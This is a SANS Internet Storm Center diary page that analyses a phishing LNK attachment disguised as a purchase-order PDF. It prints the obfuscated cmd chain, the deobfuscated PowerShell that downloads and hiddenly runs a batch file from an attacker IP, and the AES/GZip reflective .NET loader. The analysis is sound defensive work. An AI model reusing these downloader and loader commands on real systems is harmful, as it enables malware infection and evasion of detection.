<!doctype html><html lang="en"><head><title>From small LNK to large malicious BAT file with zero VT score - SANS Internet Storm Center</title>
    <meta charset="utf-8">
    <meta name="viewport" content="" >
    <meta property="og:site_name" content="SANS Internet Storm Center" >
    <meta property="og:locale" content="en_US" >
    <meta property="og:type" content="website" >
    <meta property="og:url" content="https://isc.sans.edu/diary/30094" >
    <meta property="twitter:site" content="@sans_isc" >
    <meta property="twitter:creator" content="@sans_isc" >
    <meta property="twitter:card" content="summary_large_image" >
    <meta property="twitter:image" content="https://isc.sans.edu/diaryimages/images/23-08-03-flow.png" >
    <meta property="twitter:image:alt" content="SANS Internet Storm Center" >
    <meta property="og:image" content="https://isc.sans.edu/diaryimages/images/23-08-03-flow.png" >
    <meta name="description" content="From small LNK to large malicious BAT file with zero VT score&comma; Author&colon; Jan Kopriva">
    <meta property="og:description" content="From small LNK to large malicious BAT file with zero VT score, Author: Jan Kopriva">
    <meta name="AUTHOR" content="SANS Internet Storm Center"/>
    <meta name="KEYWORDS" content="isc&comma; sans&comma; internet&comma; security&comma; threat&comma; worm&comma; virus&comma; phishing&comma; hacking&comma; vulnerability&comma; podcast"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="/iscfavicon.ico" />
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="canonical" href="https://isc.sans.edu/diary/30094" />
    <link type="text/css" rel="stylesheet" href="/css/screen.css" />
    <link type="text/css" rel="stylesheet" href="/css/msft.css" />
    <link type="text/css" rel="stylesheet" href="/css/fontawesome.css" />
    <!--<link type="text/css" rel="stylesheet" href="/3p/highlight/default.min.css" />-->
    <link type="text/css" rel="stylesheet" href="/css/v3.css" />
    <link rel="stylesheet" type="text/css" href="/css/bootstrap-modal/bootstrap-modal.min.css"/>
    

<script type="text/javascript" src="/js/jquery-3.7.0.min.js"></script>
<script language="javascript" type="text/javascript" src="https://isc.sans.edu/js/count.js"></script>
<script src="/js/bootstrap-modal/bootstrap.min.js"></script>
<script type="application/ld+json">
{
	"@context": "https://schema.org",
	"@type": "Organization",
	"name": "SANS Internet Storm Center",
	"url":   "https://isc.sans.edu/",
	"logo": "https://isc.sans.edu/diaryimages/images/23-08-03-flow.png",
	"email": "handlers@isc.sans.edu",
	"address": {
		   "streetAddress": "8120 Woodmont Avenue, Suite 310",
		   "addressLocality": "Bethesda",
		   "addressRegion": "Maryland",
		   "addressCountry": "USA",
		   "postalCode": "20814"
        },
 	"sameAs": [
	          "https://twitter.com/sans_isc"
		  ]
}
</script>


<link href="/css/codesnippet/lib/highlight/styles/default.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="/css/teachingschedule.css" />
<script src="/css/codesnippet/lib/highlight/highlight.pack.js"></script>
<script src="/js/commentmanagement.js"></script>
<!-- this is not the comment you are looking for 7d0eb3de1a34072c87 -->
</head>
<body class="isc">
    <div id="container" class="isc-container">
    <header id="isc-header">
        <div class="eupopup eupopup-top"></div>
        <h1>
            <a href="/">
                <svg width="80" height="70" viewBox="0 45 125 125" fill="none" xmlns="http://www.w3.org/2000/svg" baseProfile="tiny" overflow="visible">
<path fill="#7A1502" d="M81.5 105.6h1.4v16.1h-1.4zm-8.2-15.2h31.8v1H73.3z"/><path fill="#FFF" d="M0 0h125v125H0z"/><path fill="#7A1502" d="M18.9 78.6h12.8v1.3H26v14.8h-1.5V79.9h-5.6z"/><path fill="none" d="M32.4 83.9c-2.3 0-3.6 2-3.8 4.2h7.5c-.1-2.2-1.4-4.2-3.7-4.2zm43.3 0c-2.7 0-4.1 2.5-4.1 5s1.4 5 4.1 5 4.1-2.5 4.1-5-1.3-5-4.1-5z"/><path fill="#7A1502" d="M32.4 82.7c-3.7 0-5.3 3.1-5.3 6.2 0 3.3 1.6 6.2 5.3 6.2 2.9 0 4.5-1.5 5.1-4.2H36c-.5 1.8-1.6 3-3.7 3-2.7 0-3.8-2.5-3.8-4.6h9c.1-3.3-1.4-6.6-5.1-6.6zm-3.9 5.4c.2-2.1 1.5-4.2 3.8-4.2s3.6 2 3.7 4.2h-7.5zm15.4-4.2c1.9 0 2.9 1.1 3.3 2.8h1.4c-.3-2.7-2.2-4-4.7-4-3.6 0-5.5 2.8-5.5 6.2 0 3.3 1.9 6.2 5.5 6.2 2.6 0 4.4-1.7 4.8-4.5h-1.4c-.2 1.9-1.6 3.3-3.4 3.3-2.7 0-4.1-2.5-4.1-5s1.3-5 4.1-5zm5.4-5.3v16.1h1.4v-6.8c0-2.3 1.4-4 3.7-4 2.3 0 3 1.5 3 3.5v7.3h1.4v-7.5c0-2.8-1-4.5-4.3-4.5-1.6 0-3.2.9-3.7 2.3v-6.5h-1.5zM60 83.1v11.6h1.4v-6.8c0-2.3 1.4-4 3.7-4 2.3 0 3 1.5 3 3.5v7.3h1.4v-7.5c0-2.8-1-4.5-4.3-4.5-1.6 0-3.2.9-3.7 2.3v-2H60zm15.7-.4c-3.6 0-5.5 2.8-5.5 6.2 0 3.3 1.9 6.2 5.5 6.2s5.5-2.8 5.5-6.2c0-3.3-1.9-6.2-5.5-6.2zm0 11.2c-2.7 0-4.1-2.5-4.1-5s1.4-5 4.1-5 4.1 2.5 4.1 5-1.3 5-4.1 5zM82 78.6h1.4v16.1H82z"/><path fill="none" d="M101.1 83.9c-2.7 0-3.8 2.4-3.8 4.8 0 2.3 1.2 4.6 3.8 4.6 2.5 0 3.7-2.3 3.7-4.6.1-2.2-1-4.8-3.7-4.8zm-7.3 5c0-2.5-1.4-5-4.1-5-2.7 0-4.1 2.5-4.1 5s1.4 5 4.1 5c2.8 0 4.1-2.5 4.1-5z"/><path fill="#7A1502" d="M95.2 88.9c0-3.3-1.9-6.2-5.5-6.2s-5.5 2.8-5.5 6.2c0 3.3 1.9 6.2 5.5 6.2s5.5-2.9 5.5-6.2zm-9.6 0c0-2.5 1.4-5 4.1-5 2.7 0 4.1 2.5 4.1 5s-1.4 5-4.1 5c-2.7 0-4.1-2.5-4.1-5zm15.5 9.3c-1.6 0-3.1-.6-3.4-2.3h-1.4c.2 2.5 2.5 3.5 4.8 3.5 3.8 0 5.1-2.1 5.2-5.6V83.1h-1.4v2c-.6-1.3-2-2.3-3.7-2.3-3.4 0-5.3 2.7-5.3 5.9 0 3.3 1.5 6 5.3 6 1.7 0 3-1 3.7-2.4v1.6c0 2.7-1.2 4.3-3.8 4.3zm0-4.8c-2.6 0-3.8-2.3-3.8-4.6 0-2.4 1.1-4.8 3.8-4.8 2.7 0 3.7 2.5 3.7 4.8.1 2.3-1.2 4.6-3.7 4.6zm11-.4-3.8-9.9h-1.5l4.6 11.6-.5 1.3c-.5 1.1-.8 1.8-2 1.8-.3 0-.6 0-1-.1v1.2c.2.1.5.1 1.1.1 1.8 0 2.3-.6 3.1-2.5l5.1-13.4h-1.4l-3.7 9.9zm-80.6 3.8H33v16.1h-1.5zm3.3 4.4v11.6h1.4V106c0-2.3 1.4-4 3.7-4 2.3 0 3 1.5 3 3.5v7.3h1.4v-7.5c0-2.8-1-4.5-4.3-4.5-1.6 0-3.2.9-3.7 2.3v-2h-1.5zM49.7 112c-1.9 0-3.3-1-3.4-2.9h-1.4c.2 2.8 2.1 4.1 4.8 4.1 2.2 0 4.7-1 4.7-3.5 0-2-1.7-3-3.3-3.2l-1.9-.4c-1-.2-2.4-.7-2.4-2 0-1.5 1.5-2 2.8-2 1.6 0 3 .8 3 2.5H54c-.1-2.5-1.9-3.7-4.3-3.7-2.1 0-4.4.9-4.4 3.3 0 2 1.4 2.6 3.2 3.1l1.8.4c1.3.3 2.5.8 2.5 2.1.1 1.6-1.7 2.2-3.1 2.2zm7.6-14.2h-1.4v3.5h-2v1.2h2v8c0 2 .6 2.6 2.5 2.6h1.3v-1.2c-.4 0-.8.1-1.2.1-1-.1-1.2-.6-1.2-1.5v-7.8h2.4v-1.2h-2.4v-3.7zm3.5 15.1h1.4v-11.6h-1.4v11.6zm0-13.8h1.4v-2.3h-1.4v2.3z"/><path fill="none" d="M69 63.4h4.5l-2.2-13.7zm23 38.7c-2.3 0-3.6 2-3.8 4.2h7.5c-.1-2.2-1.4-4.2-3.7-4.2z"/><path fill="#7A1502" d="M69.2 102.4v-1.2h-2.4v-3.5h-1.4v3.5h-2v1.2h2v8c0 2 .6 2.6 2.5 2.6h1.3v-1.2c-.4 0-.8.1-1.2.1-1-.1-1.1-.6-1.1-1.5v-7.8h2.3zm10.5 10.5v-11.6h-1.4v6.1c0 2.4-1.1 4.7-3.5 4.7-2.3 0-3-1.1-3.1-3.2v-7.6h-1.4v7.6c0 2.7 1.1 4.4 4.1 4.4 1.7 0 3.3-.9 4-2.4v2.1h1.3zm6.4-10.5v-1.2h-2.4v-3.5h-1.4v3.5h-2v1.2h2v8c0 2 .6 2.6 2.5 2.6h1.3v-1.2c-.4 0-.8.1-1.2.1-1-.1-1.2-.6-1.2-1.5v-7.8h2.4zm5.9-1.5c-3.7 0-5.3 3.1-5.3 6.2 0 3.3 1.6 6.2 5.3 6.2 2.9 0 4.5-1.5 5.1-4.2h-1.4c-.5 1.8-1.6 3-3.7 3-2.7 0-3.8-2.5-3.8-4.6h9c0-3.3-1.5-6.6-5.2-6.6zm-3.9 5.4c.2-2.1 1.5-4.2 3.8-4.2s3.6 2 3.7 4.2h-7.5zM60.2 71.7c-1.3 0-2.4-.9-3.3-2.6-.9-1.7-1.4-4-1.5-6.8h-.7v10h.7l1-1.9c.6.7 1.3 1.3 1.9 1.6.6.3 1.3.5 2.1.5 1.3 0 2.4-.6 3.3-1.9.8-1.3 1.2-2.9 1.2-5 0-1.4-.3-2.8-.8-4.3-.6-1.5-1.6-3.3-3.1-5.6-.4-.5-.9-1.3-1.5-2.2-1.8-2.5-2.6-4.3-2.6-5.5 0-.8.2-1.5.6-2 .4-.5.9-.7 1.6-.7 1 0 1.9.7 2.6 2.2.7 1.5 1.2 3.5 1.4 6.1h.7v-9h-.7l-.8 1.8c-.4-.6-.9-1-1.5-1.4s-1.1-.5-1.7-.5c-1.2 0-2.1.6-2.9 1.7-.8 1.1-1.1 2.6-1.1 4.5 0 1.5.2 3 .7 4.4.5 1.4 1.6 3.3 3.2 5.8 1.3 2 2.3 3.6 2.8 4.9.6 1.3.8 2.4.8 3.3 0 .8-.2 1.5-.6 2-.6.3-1.1.6-1.8.6zm19.7-.5h-1l-4.6-26.4h-3.2l-4.2 22.6c0 .1 0 .2-.1.3-.4 2.1-1.2 3.3-2.3 3.5v.8h5.6v-.8c-.8 0-1.3-.2-1.6-.4-.3-.2-.5-.7-.5-1.2V69c0-.2 0-.4.1-.7l.6-3.9h4.9l1.1 6.9h-1.9v.7h7l.1-.8zM69 63.4l2.3-13.7 2.2 13.7H69zm12.5 6.9c-.3.5-.8.8-1.6.9v.8H86v-.8c-1.1-.1-1.8-.4-2.3-1-.4-.6-.6-1.6-.6-3.1V49.5L92.4 72h.8V48.8c0-1.3.1-2.1.4-2.5.3-.4.8-.6 1.5-.6h.1v-.8h-5.7v.8c.9 0 1.5.3 1.9.8.4.6.6 1.4.6 2.7v12.1l-6.6-16.4h-5.2v.8H82v21.7c0 1.5-.2 2.5-.5 2.9zm21.3-14.7c-.4-.5-.9-1.3-1.5-2.2-1.8-2.5-2.6-4.3-2.6-5.5 0-.8.2-1.5.6-2 .4-.5.9-.7 1.6-.7 1 0 1.9.7 2.6 2.2.7 1.5 1.2 3.5 1.4 6.1h.7v-9h-.7l-.8 1.8c-.4-.6-.9-1-1.5-1.4-.6-.3-1.1-.5-1.7-.5-1.2 0-2.1.6-2.9 1.7-.8 1.1-1.1 2.6-1.1 4.5 0 1.5.2 3 .7 4.4.5 1.4 1.6 3.3 3.2 5.8 1.3 2 2.3 3.6 2.8 4.9.6 1.3.8 2.4.8 3.3 0 .8-.2 1.5-.6 2-.4.5-1 .8-1.7.8-1.3 0-2.4-.9-3.3-2.6-.9-1.7-1.4-4-1.5-6.8h-.7v10h.7l1-1.9c.6.7 1.3 1.3 1.9 1.6.6.3 1.3.5 2.1.5 1.3 0 2.4-.6 3.3-1.9.8-1.3 1.2-2.9 1.2-5 0-1.4-.3-2.8-.8-4.3-.6-1.7-1.7-3.5-3.2-5.8z"/><path fill="#7A1502" d="M73.8 63.4h31.9v.9H73.8z"/>
</svg>



</a>
            <span id="pagetitle">            <a href="/">Internet Storm Center</a></span>
        </h1>
        <div class="isc-signin">
            <form id="headerSearch" name="searchform" action="/search.html" method="get">
                <input type="text" name="q" placeholder="Search...(IP, Port..)" />
                <input type="hidden" id="token" name="token" value="2ce6858260f41bb441f6ccb4211362990fb9b29e" />
<input class="btn btn-primary" type="submit" name="Search" value="Search">
            </form>
        
    
            <div id="smallHeaderLogin">
                <a class="btn btn-primary" href="/login.html">Sign In</a>
                <a class="btn" href="/register.html">Sign Up</a>
                <a href="#navigation"></a>
            </div>
	    
    </header>
	    <div id="content">
		    <div class="wrapper">
		        <div class="isc-alerts">
		            
		        

<div id="topbanner">
<a href="https://www.sans.org/cyber-security-training-events/network-security-2024">SANS Network Security: Las Vegas Sept 4-9.</a>
</div>

		            <div>
		                <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M7.07,18.28C7.5,17.38 10.12,16.5 12,16.5C13.88,16.5 16.5,17.38 16.93,18.28C15.57,19.36 13.86,20 12,20C10.14,20 8.43,19.36 7.07,18.28M18.36,16.83C16.93,15.09 13.46,14.5 12,14.5C10.54,14.5 7.07,15.09 5.64,16.83C4.62,15.5 4,13.82 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20,12C20,13.82 19.38,15.5 18.36,16.83M12,6C10.06,6 8.5,7.56 8.5,9.5C8.5,11.44 10.06,13 12,13C13.94,13 15.5,11.44 15.5,9.5C15.5,7.56 13.94,6 12,6M12,11A1.5,1.5 0 0,1 10.5,9.5A1.5,1.5 0 0,1 12,8A1.5,1.5 0 0,1 13.5,9.5A1.5,1.5 0 0,1 12,11Z" />
                        </svg>
		                Handler on Duty: <a title="Johannes Ullrich" href="/handler_list.html#johannes-ullrich">Johannes Ullrich</a>
                    </div>
                    <div>Threat Level: <a href="/infocon.html" style="text-transform: capitalize; color: green">green</a></div>
                </div>
		    <div class="main-content"><ul class="diaryPagination"><li><a href="/diary/30088">previous</a></li><li><a href="/diary/30098">next</a></li></ul>
<article>
    
		<div class="diary">
<script>
function maxarticle() {
	 var article=document.getElementsByTagName('article');
	 var cn=article[0].className;
	 if ( article[0].className=='fullscreen' ) {
	 	 article[0].className='normal';	 
         } else {
	 	 article[0].className='fullscreen';
         }
}
</script>

<h1><a href="/forums/diary/From+small+LNK+to+large+malicious+BAT+file+with+zero+VT+score/30094/" >From small LNK to large malicious BAT file with zero VT score</a></h1>
<div class="ss-container" style="float: right; border: 0px none; margin: 8px 0px 0px 8px;">
    <ul class="ss-share">
    <li class="ss-share-item">
    <a class="ss-share-link ico-fullscreen" title="Full Screen" onclick="maxarticle();"></a>
    <li class="ss-share-item">
    <a class="ss-share-link ico-facebook" title="Share on Facebook" href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Fisc.sans.edu%2Fforums%2Fdiary%2F30094" rel="nofollow" target="_blank"></a>
    </li>
    <li class="ss-share-item">
    <a class="ss-share-link ico-twitter" title="Share on Twitter" href="http://twitter.com/share?text=From%20small%20LNK%20to%20large%20malicious%20BAT%20file%20with%20zero%20VT%20score&amp;url=https%3A%2F%2Fisc.sans.edu%2Fforums%2Fdiary%2F30094&amp;via=SANS_ISC" rel="nofollow" target="_blank"></a>
    </li>
    </ul>
</div>


 
		<div class="diaryheader">
<b>Published</b>: 2023-08-03. <b>Last Updated</b>: 2023-08-03 15:49:44 UTC<br />
<b>by</b> <a href="/handler_list.html#jan-kopriva">Jan Kopriva</a> (Version: 1)<br />

</div>
<a class="ico-comments" href="/diary/From+small+LNK+to+large+malicious+BAT+file+with+zero+VT+score/30094/#comments">1 comment(s)</a>
  <script language="javascript" type="text/javascript" src="/js/diarycount.js?diary=30094"></script>
<div class="diarybody">
<p>Last week, my spam trap caught an e-mail with LNK attachment, which turned out to be quite interesting.</p>

<p><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-flow.png" style="display: none;" /></p>

<p>The e-mail message was the usual malspam fare trying to appear as a purchase order sent to the recipient&hellip;</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-03-mail.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-mail.png" style="border-width: 1px; border-style: solid; width: 600px; height: 501px;" /></a></p>

<p>&hellip;however, the attachment, named &ldquo;Purchase%20Order%20PO007289.pdf.zip&rdquo;, was somewhat more intriguing. As you have probably guessed, it did not contain a PDF file, as its name might have suggested, but instead a 15 kB LNK.</p>

<p>If one were to look at the LNKs properties using the standard Windows dialog, one would only see the following string as the &ldquo;target&rdquo; for the shortcut, given that the textbox in the dialog supports only a fairly short string.</p>

<pre>
<code>%ComSpec% /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /shakir /</code></pre>

<p>Since the &ldquo;target&rdquo; string begins with the ComSpec variable[<a href="https://en.wikipedia.org/wiki/COMSPEC">1</a>], we can clearly see that the LNK is pointing at cmd.exe (at least on any Windows system with usual configuration), but that is about all we can be certain about at this point. To get to further details, we might take advantage of some specialized tool for analyzing LNK files, however, any hex editor can serve us just as well.</p>

<p>Even if one didn&rsquo;t understand the internal structure of the Shell Link file format[<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943">2</a>], one would only have to locate a string in the file containing multiple &ldquo;/shakir&rdquo; substrings to be able to get to the entire command that the file is supposed to execute.</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-03-shakir.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-shakir.png" style="border-width: 1px; border-style: solid; width: 700px; height: 678px;" /></a></p>

<p>After exporting the entire relevant string, removing null bytes and getting rid of all &ldquo;/shakir&rdquo; strings (64 in total), the command that the LNK was supposed to execute came down to:</p>

<pre>
<code>cmd.exe /r %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "njDpgP=chas" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "AHtypC= %temp%" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "KrAYyI=t ms" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "hHdtLb=powe" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "OZHygs=20PO" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "KIDRmI=Uni." &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "eIGMXx=edge" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "rMMXXr=\Pur" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "rcbQQv=0072" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "lggfDX=e -e" &amp;

?

&amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "EuMaFU=85.2" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "zwVAcR=.exe" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "tBZUtU=0072" &amp; %ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1% "modOVS= 'ht" &amp;
call %hHdtLb%%GkyASq%%urZjnx%%xDqWXQ%%DcsJSj%%lggfDX%%vtYPMl%%McuiOY%%WARyti%%hlKmPJ%%IWrooM%%kpOcNU%%yIRfkU%%wuntNs%%rMMXXr%%njDpgP%%TxOIYy%%kUNXaL%%rcbQQv%%wpjZWB%%amswOE%%rjCblM%%fOvOjT%%EuMaFU%%qwsiSQ%%GUAmHL%%gNfjGQ%%iqRoKc%%ZHgpuC%%OZHygs%%liqLuq%%mSgJIv%%OvOWSp%%cbMqjl%%KrAYyI%%eIGMXx%%zwVAcR%%WpZKAY%%NRgrvf%%GVZfbd%%QouxFZ%%Obyrxv%%tBZUtU%%laQBkG%%BMmBgc%%ytvSKN%%wyKZVy%%AwuLYT%%gLBeTa%%modOVS%%MnVwTd%%aBRlxU%%kmerbO%%lQOtvv%%AtAuFw%%KIDRmI%%DeCrKw%%cVoGUH%%WVnpDf%%dtSAVA%%CFWuBP%%rsZvOX%%lUfsrz%%hTyTyJ%%jufxOT%%QdicOf%%AHtypC%%HAgqdJ%%ZLbstb%</code></pre>

<p>As we may see, it is obfuscated, though not heavily &ndash; all readable strings are appended to</p>

<pre>
<code>%ProgramFiles(x86):~15,-6%e%ALLUSERSPROFILE:~-2,-1%</code></pre>

<p>which translates to &ldquo;set&rdquo;.</p>

<p><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-set.png" style="width: 600px; height: 55px;" /></p>

<p>The first part of the code therefore sets several (69, to be exact) variables, and the second part, beginning with the &ldquo;call&rdquo; command, then uses these variables to execute the intended code.</p>

<p>Although we could manually deobfuscate the code, since it is not too long, a much better approach would be to use the obfuscated script to &ldquo;deobfuscate itself&rdquo;. To do this, all we would have to do would be to replace the &ldquo;call&rdquo; command with an &ldquo;echo&rdquo; command&rdquo; and let the script run.</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-03-cmd.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-cmd.png" style="border-width: 1px; border-style: solid; width: 801px; height: 404px;" /></a></p>

<p>As we may see, the entire obfuscated script came down to the following command.</p>

<pre>
<code>powershell -noprofile -ep bypass -w hidden -c curl -o 'C:\Users\[User]\AppData\Local\Temp\Pur%njDpgP%e%20Order%20PO007289.pdf' 'http://85.208.139.229/Purchase%20Order%20PO007289.pdf';
start msedge.exe 'C:\Users\[User]\AppData\Local\Temp\Purchase%20Order%20PO007289.pdf';
curl -o C:\Users\[User]\AppData\Local\Temp\Uni.bat 'http://85.208.139.229/Uni.bat';
start -windowstyle hidden -filepath C:\Users\[User]\AppData\Local\Temp\Uni.bat</code></pre>

<p>The script is therefore supposed to download a PDF file named &ldquo;Purchase%20Order%20PO007289.pdf&rdquo; and open it in MS Edge, then download a batch file named &ldquo;Uni.bat&rdquo; and execute it.</p>

<p>Given that the LNK was named like a PDF document, the download and opening of a PDF file makes complete sense and was undoubtedly intended to make it appear as if the LNK was indeed a valid document&hellip; Even if the PDF didn&rsquo;t contain the promised purchase order, but merely banking information for an unrelated company.</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-03-pdf.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-pdf.png" style="width: 700px; height: 595px;" /></a></p>

<p>The batch file was almost 14 MB in size and at the time of writing still had a 0/59 detection rate on VirusTotal[<a href="https://www.virustotal.com/gui/file/8c01ef8b6a9cfa7a80fd5bcb640d68a63ef17dd25ea3e260c7971b1fa156c8be">3</a>]&hellip;</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-03-vt.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-vt.png" style="width: 800px; height: 128px;" /></a></p>

<p>Contrary to this result, the contents of the BAT file are less than benign&hellip;though they are fairly heavily obfuscated.</p>

<p>After it is executed, the batch file copies a local &ldquo;powershell.exe&rdquo; executable into the same directory where it is located as &ldquo;Uni.bat.exe&rdquo;. It then uses the newly created EXE to run the following script (which has been &ldquo;beautified&rdquo; somewhat to increase readability).</p>

<pre>
<code>"Uni.bat.exe" -noprofile -windowstyle hidden -ep bypass -command

function clDaz($igqAD){
 $BDOYy=[System.Security.Cryptography.Aes]::Create();
 $BDOYy.Mode=[System.Security.Cryptography.CipherMode]::CBC;
 $BDOYy.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
 $BDOYy.Key=[System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('FtcTL30LuEgrLCRQ6F1/TYZL8DL5fU3tJLXeZWB0Mcs=');
 $BDOYy.IV=[System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('SrREJkd4YhlCXMUuNZgEQw==');
 $BOvYy=$BDOYy.CreateDecryptor();
 $return_var=$BOvYy.TransformFinalBlock($igqAD, 0, $igqAD.Length);
 $BOvYy.Dispose();
 $BDOYy.Dispose();
 $return_var;
}

function WtwUM($igqAD){
 $YAreW=New-Object System.IO.MemoryStream(,$igqAD);
 $Cvzjk=New-Object System.IO.MemoryStream;
 $qEksd=New-Object System.IO.Compression.GZipStream($YAreW, [IO.Compression.CompressionMode]::Decompress);
 $qEksd.CopyTo($Cvzjk);
 $qEksd.Dispose();
 $YAreW.Dispose();
 $Cvzjk.Dispose();
 $Cvzjk.ToArray();
}

function RUsyF($igqAD,$GoexF){
 $MJUcA=[System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$igqAD);
 $TeSPg=$MJUcA.EntryPoint;
 $TeSPg.Invoke($null, $GoexF);
}

$LUpYe=[System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\user\AppData\Local\Temp\Uni.bat').Split([Environment]::NewLine);
foreach ($SCWoC in $LUpYe) { if ($SCWoC.StartsWith('SEROXEN')) { $vJdWE=$SCWoC.Substring(7); break; }}
$THBXN=[string[]]$vJdWE.Split('\');
$weYGE=WtwUM (clDaz ([Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($THBXN[0])));
$czNML=WtwUM (clDaz ([Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($THBXN[1])));
RUsyF $czNML (,[string[]] ('', 'idTznCCsreqaEEjvuwzuTuitglIVMFHEuLsTnnuHsLwyMmxaqK', 'LkIzMJCsatThEdeYOSSAwnZMOfyqejPcYtnoxQiuObLPDohIJN'));
RUsyF $weYGE (,[string[]] ('', 'idTznCCsreqaEEjvuwzuTuitglIVMFHEuLsTnnuHsLwyMmxaqK', 'LkIzMJCsatThEdeYOSSAwnZMOfyqejPcYtnoxQiuObLPDohIJN'));</code></pre>

<p>If we look at the last 7 lines of code, we can see that the script reads the content of the Uni.bat file and extracts from it all text which follows the &ldquo;SEROXEN&rdquo; string. It then splits the extracted text into multiple (2) parts, each of which is then subjected to the same operations. Each substring is decoded from its Base64-encoded form, decrypted using AES (by the function <em>clDaz</em>) and finally decompressed using GZip (by the function <em>WtwUM</em>). The resulting content &ndash; two heavily obfuscated .NET binaries &ndash; Is then reflectively loaded into memory and executed (using the function <em>RUsyF</em>).</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-03-flow.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-03-flow.png" style="border-width: 1px; border-style: solid; width: 800px; height: 238px;" /></a></p>

<p>Unlike the aforementioned batch files, both components of the final infection stage [<a href="https://www.virustotal.com/gui/file/623323d7fc27927dd0c7e08208d6677ca8bf64263e38e31de00660a3156964a4">4</a>,<a href="https://www.virustotal.com/gui/file/0664673cd5981106172b8df9f730afa55247bf6943e5ca4f7eb7d8be2e0a15ee">5</a>] have non-zero detection rates on VirusTotal (13/70 and 17/71 respectively), though they mostly seem to be detected using generic signatures.</p>

<p>Therefore, if any of our readers knows what family of malware the zero-scoring batch file or the subsequent .NET binaries might belong to, feel free to comment/reach out to me &ndash; it would be interesting to learn more, since even platforms specializing in identifying code overlap between malware samples didn&rsquo;t manage to point to anything significant when it came to the .NET code of the final stage[<a href="https://analyze.intezer.com/analyses/6838b5fc-629a-45a5-b40c-57bcabe21c3d/sub/cbf91332-c33b-4edd-9219-dc3b54e63955/">6</a>,<a href="https://analyze.intezer.com/analyses/ac6cf7d6-ed1d-4be2-8a65-b3f6658ed3e1/sub/f993c083-5163-4242-9f41-6aed792a3ab2/">7</a>]&hellip;</p>

<p>[1] <a href="https://en.wikipedia.org/wiki/COMSPEC">https://en.wikipedia.org/wiki/COMSPEC</a><br />
[2] <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943</a><br />
[3] <a href="https://www.virustotal.com/gui/file/8c01ef8b6a9cfa7a80fd5bcb640d68a63ef17dd25ea3e260c7971b1fa156c8be">https://www.virustotal.com/gui/file/8c01ef8b6a9cfa7a80fd5bcb640d68a63ef17dd25ea3e260c7971b1fa156c8be</a><br />
[4] <a href="https://www.virustotal.com/gui/file/623323d7fc27927dd0c7e08208d6677ca8bf64263e38e31de00660a3156964a4">https://www.virustotal.com/gui/file/623323d7fc27927dd0c7e08208d6677ca8bf64263e38e31de00660a3156964a4</a><br />
[5] <a href="https://www.virustotal.com/gui/file/0664673cd5981106172b8df9f730afa55247bf6943e5ca4f7eb7d8be2e0a15ee">https://www.virustotal.com/gui/file/0664673cd5981106172b8df9f730afa55247bf6943e5ca4f7eb7d8be2e0a15ee</a><br />
